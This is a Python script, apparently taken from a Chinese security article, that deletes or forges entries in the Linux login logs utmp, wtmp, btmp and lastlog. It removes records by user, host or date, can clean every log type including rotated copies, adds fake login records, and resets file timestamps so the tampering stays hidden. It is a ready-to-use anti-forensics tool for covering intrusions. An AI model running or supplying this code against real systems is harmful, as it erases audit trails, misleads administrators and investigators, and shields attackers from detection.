#!/usr/bin/env python3
# -*- coding:utf-8 -*-
# author knpewg85942
# link: https://www.freebuf.com/articles/system/141474.html
# blog: https://forreestx386.github.io/
#
# Clean/add fake records in utmp/wtmp/btmp/lastlog login log files.
# Compatible with Python 2.7 and Python 3.x.

from __future__ import print_function

import os
import sys
import glob
import time
import random
import struct
import argparse
from pwd import getpwnam

PY2 = sys.version_info[0] == 2


class GeneralError(Exception):
    pass


class FakeLog(object):
    def __init__(self, args, file_path=None, log_type=None):
        self.type = log_type if log_type else args.type
        self.user = args.user
        self.host = args.host
        self.timestamp = args.timestamp
        self.date = None
        self.date_end = None
        if args.date:
            try:
                ts = time.mktime(
                    time.strptime(args.date, "%Y-%m-%d %H:%M:%S"))
                self.date = int(ts)
                self.date_end = self.date
            except ValueError:
                ts_start = time.mktime(
                    time.strptime(args.date + ':0', "%Y-%m-%d %H:%M:%S"))
                ts_end = time.mktime(
                    time.strptime(args.date + ':59', "%Y-%m-%d %H:%M:%S"))
                self.date = int(ts_start)
                self.date_end = int(ts_end)

        self.tty = args.tty
        self.pid = args.pid
        self.FILE_DICT = {
            'utmp': '/var/run/utmp',
            'wtmp': '/var/log/wtmp',
            'btmp': '/var/log/btmp',
            'lastlog': '/var/log/lastlog'
        }
        # Allow overriding file path (used for processing rotated logs)
        if file_path:
            self.FILE_PATH = file_path
        else:
            self.FILE_PATH = self.FILE_DICT[self.type]
        self.XTMP_STRUCT = 'hi32s4s32s256shhiii4i20x'
        self.XTMP_STRUCT_SIZE = struct.calcsize(self.XTMP_STRUCT)
        self.LAST_STRUCT = 'I32s256s'
        self.LAST_STRUCT_SIZE = struct.calcsize(self.LAST_STRUCT)

    @staticmethod
    def _decode(val):
        """Decode a struct.unpack bytes field to str, trimming trailing NULs; py2/py3 safe."""
        if PY2:
            if isinstance(val, str):
                return val.split('\0', 1)[0]
            return str(val)
        else:
            if isinstance(val, bytes):
                return val.split(b'\0', 1)[0].decode('utf-8', errors='replace')
            return str(val)

    def get_timestamp_by_user(self):
        """
        Get the timestamp of the user's last login from /var/log/wtmp by username.
        :return: int timestamp or None
        """
        _result = []
        with open(self.FILE_DICT['wtmp'], 'rb') as fd:
            while True:
                record_bytes = fd.read(self.XTMP_STRUCT_SIZE)
                if not record_bytes:
                    break
                data = struct.unpack(self.XTMP_STRUCT, record_bytes)
                record = [self._decode(i) for i in data]
                if record[4] == self.user:
                    _result.append(record[-6])
        return max(_result) if _result else None

    def delete_log(self):
        """
        Delete matching records from utmp | wtmp | btmp | lastlog.
        :return:
        """
        _atime = os.stat(self.FILE_PATH).st_atime
        _mtime = os.stat(self.FILE_PATH).st_mtime
        file_size = os.path.getsize(self.FILE_PATH)

        if self.type.endswith('tmp'):  # xtmp log: utmp / wtmp / btmp
            to_remain = bytearray()  # bytearray is much faster than bytes concatenation
            deleted = 0
            processed = 0
            try:
                with open(self.FILE_PATH, 'rb') as fd:
                    while True:
                        record_bytes = fd.read(self.XTMP_STRUCT_SIZE)
                        if not record_bytes:
                            break
                        # Skip a trailing partial record to avoid struct errors
                        if len(record_bytes) < self.XTMP_STRUCT_SIZE:
                            to_remain.extend(record_bytes)
                            break
                        processed += 1
                        data = struct.unpack(self.XTMP_STRUCT, record_bytes)
                        record = [self._decode(i) for i in data]
                        _user = record[4]
                        _host = record[5]
                        _date = record[9]

                        keep = True
                        # Match logic
                        match_user = (self.user is None) or (_user == self.user)
                        match_host = (self.host is None) or (_host == self.host)
                        match_date = True
                        if self.date is not None:
                            match_date = (self.date <= _date <= self.date_end)

                        if match_user and match_host and match_date:
                            # All conditions match: drop this record
                            keep = False
                            deleted += 1

                        if keep:
                            to_remain.extend(record_bytes)

                        # Progress indicator for large files
                        if processed % 5000 == 0:
                            pos = fd.tell()
                            percent = pos * 100 // file_size if file_size > 0 else 0
                            print('    Processed %d records, deleted %d, %d%%' %
                                  (processed, deleted, percent),
                                  end='\r', file=sys.stderr)

            except OSError as e:
                raise GeneralError('file error: {0}'.format(str(e)))
            except Exception as e:
                raise GeneralError('error occur: {0}'.format(str(e)))
            else:
                with open(self.FILE_PATH, 'wb') as fd:
                    fd.write(to_remain)
                os.utime(self.FILE_PATH, (_atime, _mtime))
                print('    Done: %d records total, deleted %d' %
                      (processed, deleted), file=sys.stderr)

        else:  # lastlog: UID-indexed sparse file - seek-and-zero is much faster
            deleted = 0
            try:
                if self.user:
                    # If a user is given, seek directly to that UID's slot and zero it (instant)
                    try:
                        p = getpwnam(self.user)
                    except KeyError:
                        raise GeneralError('No such user: %s' % self.user)

                    # Read the existing record to confirm it matches before clearing
                    with open(self.FILE_PATH, 'rb+') as fd:
                        fd.seek(self.LAST_STRUCT_SIZE * p.pw_uid)
                        record_bytes = fd.read(self.LAST_STRUCT_SIZE)
                        if len(record_bytes) == self.LAST_STRUCT_SIZE:
                            data = struct.unpack(self.LAST_STRUCT, record_bytes)
                            record = [self._decode(i) for i in data]
                            _timestamp = record[0]
                            _host = record[2]

                            match_host = (self.host is None) or (_host == self.host)
                            match_date = True
                            if self.date is not None:
                                match_date = (self.date == _timestamp)

                            if match_host and match_date:
                                # Zero out this entry
                                fd.seek(self.LAST_STRUCT_SIZE * p.pw_uid)
                                fd.write(b'\x00' * self.LAST_STRUCT_SIZE)
                                deleted = 1
                else:
                    # No user specified - walk the entire file
                    to_remain = bytearray()
                    processed = 0
                    with open(self.FILE_PATH, 'rb') as fd:
                        while True:
                            record_bytes = fd.read(self.LAST_STRUCT_SIZE)
                            if not record_bytes:
                                break
                            if len(record_bytes) < self.LAST_STRUCT_SIZE:
                                to_remain.extend(record_bytes)
                                break
                            processed += 1
                            data = struct.unpack(self.LAST_STRUCT, record_bytes)
                            record = [self._decode(i) for i in data]
                            _timestamp = record[0]
                            _host = record[2]

                            keep = True
                            match_host = (self.host is None) or (_host == self.host)
                            match_date = True
                            if self.date is not None:
                                match_date = (self.date == _timestamp)

                            # All-zero slots are empty/invalid; keep them as-is
                            is_empty = (record_bytes == b'\x00' * self.LAST_STRUCT_SIZE)
                            if not is_empty and match_host and match_date:
                                keep = False
                                deleted += 1

                            if keep:
                                to_remain.extend(record_bytes)

                    with open(self.FILE_PATH, 'wb') as fd:
                        fd.write(to_remain)

            except OSError as e:
                raise GeneralError('file error: {0}'.format(str(e)))
            except Exception as e:
                raise GeneralError('error occur: {0}'.format(str(e)))
            else:
                os.utime(self.FILE_PATH, (_atime, _mtime))
                print('    lastlog done: deleted %d record(s)' % deleted, file=sys.stderr)

    def add_log(self):
        """
        Add fake/decoy log records to
        utmp | wtmp | btmp | lastlog
        :return:
        """
        to_add_xtmp = [
            7, 13009, b'pts/4', b'ts/4', b'root', b'10.1.100.10', 0, 0, 0,
            1500475658, 498851, 23331082, 0, 0, 0
        ]

        to_add_btmp = [
            6, 13732, b'ssh:notty', b'', b'root', b'10.1.100.1', 0, 0, 0,
            1500311234, 0, 23331082, 0, 0, 0
        ]

        record_bytes = None
        _backup = None
        _atime = os.stat(self.FILE_PATH).st_atime
        _mtime = os.stat(self.FILE_PATH).st_mtime

        # Ensure string fields are bytes (py3) / str (py2)
        def _b(s):
            if isinstance(s, bytes):
                return s
            if PY2:
                return s.encode('utf-8') if isinstance(s, unicode) else s
            return s.encode('utf-8')

        if self.FILE_PATH.endswith('utmp') or self.FILE_PATH.endswith('wtmp'):
            if self.user:
                to_add_xtmp[4] = _b(self.user)
            if self.host:
                to_add_xtmp[5] = _b(self.host)
            if self.tty:
                to_add_xtmp[2] = _b(self.tty)
                to_add_xtmp[3] = _b(self.tty[1:])
            if self.pid:
                to_add_xtmp[1] = int(self.pid)
            if self.date:
                to_add_xtmp[-6] = int(self.date) + random.randint(1, 60)
            if self.timestamp:
                to_add_xtmp[-6] = int(self.timestamp)

            record_bytes = struct.pack(self.XTMP_STRUCT, *to_add_xtmp)

            with open(self.FILE_PATH, 'rb') as fd:
                _backup = fd.read() + record_bytes

            with open(self.FILE_PATH, 'wb') as fd:
                fd.write(_backup)

            os.utime(self.FILE_PATH, (_atime, _mtime))

        elif self.FILE_PATH.endswith('btmp'):
            if self.user:
                to_add_btmp[4] = _b(self.user)
            if self.host:
                to_add_btmp[5] = _b(self.host)
            if self.tty:
                to_add_btmp[2] = _b(self.tty)
                to_add_btmp[3] = _b(self.tty[1:])
            if self.pid:
                to_add_btmp[1] = int(self.pid)
            if self.date:
                to_add_btmp[-6] = int(self.date)
            if self.timestamp:
                to_add_btmp[-6] = int(self.timestamp)

            record_bytes = struct.pack(self.XTMP_STRUCT, *to_add_btmp)
            with open(self.FILE_PATH, 'rb') as fd:
                _backup = fd.read() + record_bytes

            with open(self.FILE_PATH, 'wb') as fd:
                fd.write(_backup)
            os.utime(self.FILE_PATH, (_atime, _mtime))

        else:
            __host = b'10.1.100.1'
            __date = 1500860089
            __tty = b'pts/8'
            if self.user:
                try:
                    p = getpwnam(self.user)
                except KeyError:
                    raise GeneralError('No such user.')

                if self.host:
                    __host = _b(self.host)
                if self.date:
                    __date = int(self.date)
                if self.timestamp:
                    __date = int(self.timestamp)
                if self.tty:
                    __tty = _b(self.tty)

                data = struct.pack(self.LAST_STRUCT, __date, __tty, __host)
                try:
                    with open(self.FILE_PATH, 'wb') as fd:
                        fd.seek(self.LAST_STRUCT_SIZE * p.pw_uid)
                        fd.write(data)
                except Exception as e:
                    raise GeneralError('Cannot open file: {0}'.format(str(e)))


if __name__ == '__main__':

    usage = 'usage: fake_login_log.py --mode delete --type utmp --user root --host 10.1.100.1\n \
        fake_login_log.py --mode delete --type wtmp --user root --host 10.1.100.1 --date "2017-07-20 15:30"'

    parse = argparse.ArgumentParser(usage=usage)
    parse.add_argument('--mode',
                       dest='mode',
                       type=str,
                       required=True,
                       help='add, delete log')
    parse.add_argument('--type',
                       dest='type',
                       type=str,
                       choices=['utmp', 'wtmp', 'btmp', 'lastlog', 'all'],
                       required=True,
                       help='utmp | wtmp | btmp | lastlog | all (all=clean all login log types)')
    parse.add_argument('--include-rotated',
                       dest='include_rotated',
                       action='store_true',
                       help='Also process rotated log files (wtmp.1 / btmp.1 etc.)')
    parse.add_argument('--file',
                       dest='file',
                       type=str,
                       help='Directly specify log file path (overrides default path for --type)')
    parse.add_argument('--user', dest='user', type=str, help='login username')
    parse.add_argument('--host', dest='host', type=str, help='login from host')
    parse.add_argument('--date',
                       dest='date',
                       type=str,
                       help='login time 2017-7-20 15:30')
    parse.add_argument('--timestamp',
                       dest='timestamp',
                       type=str,
                       help='login time 1500475126')
    parse.add_argument('--pid',
                       dest='pid',
                       type=str,
                       default=random.randint(os.getpid() + 100,
                                              os.getpid() + 1000),
                       help='process id, for add only')
    parse.add_argument('--tty', dest='tty', type=str, help='for add only')

    argument = parse.parse_args()

    if argument.mode not in ('add', 'delete', 'modify'):
        raise GeneralError('error mode')

    if not any(
        (argument.user, argument.host, argument.date, argument.timestamp)):
        raise GeneralError(
            'you must choose at least user | host | date |timestamp as condition'
        )

    def _get_files_for_type(log_type):
        """Return the main log file plus matching rotated files for the given type."""
        paths = [_dummy.FILE_DICT[log_type]]
        if argument.include_rotated:
            base = _dummy.FILE_DICT[log_type]
            patterns = [
                base + '.[0-9]*',
                base + '.old',
                base + '-[0-9]*',
            ]
            for pat in patterns:
                paths.extend(glob.glob(pat))
        # Filter out non-existent paths and compressed archives
        valid = []
        for p in paths:
            if os.path.exists(p) and os.path.isfile(p):
                if p.endswith('.gz') or p.endswith('.bz2') or p.endswith('.xz'):
                    print('[!] Skipping compressed file %s (decompress manually first)' % p)
                    continue
                valid.append(p)
        return valid

    if argument.mode == 'add':
        print("add")
        if argument.file:
            FakeLog(argument, file_path=argument.file).add_log()
        elif argument.type == 'all':
            raise GeneralError('add mode does not support type=all; specify a concrete --type')
        else:
            FakeLog(argument).add_log()
    else:
        # delete mode
        # Dummy instance used only to access FILE_DICT constants
        _dummy = object.__new__(FakeLog)
        _dummy.FILE_DICT = {
            'utmp': '/var/run/utmp',
            'wtmp': '/var/log/wtmp',
            'btmp': '/var/log/btmp',
            'lastlog': '/var/log/lastlog'
        }

        def _infer_type(fpath, default):
            base = os.path.basename(fpath)
            if 'lastlog' in base:
                return 'lastlog'
            if 'btmp' in base:
                return 'btmp'
            if 'utmp' in base:
                return 'utmp'
            if 'wtmp' in base:
                return 'wtmp'
            return default

        types_to_clean = ['utmp', 'wtmp', 'btmp', 'lastlog'] if argument.type == 'all' else [argument.type]

        total_processed = 0
        for t in types_to_clean:
            if argument.file:
                files = [argument.file]
            else:
                files = _get_files_for_type(t)

            for fpath in files:
                try:
                    print('[*] Cleaning %s ...' % fpath)
                    real_type = _infer_type(fpath, t)
                    fl = FakeLog(argument, file_path=fpath, log_type=real_type)
                    fl.delete_log()
                    print('[+] %s cleaned' % fpath)
                    total_processed += 1
                except Exception as e:
                    print('[-] Failed to clean %s: %s' % (fpath, str(e)))

        print('\n[*] Finished: processed %d log file(s)' % total_processed)
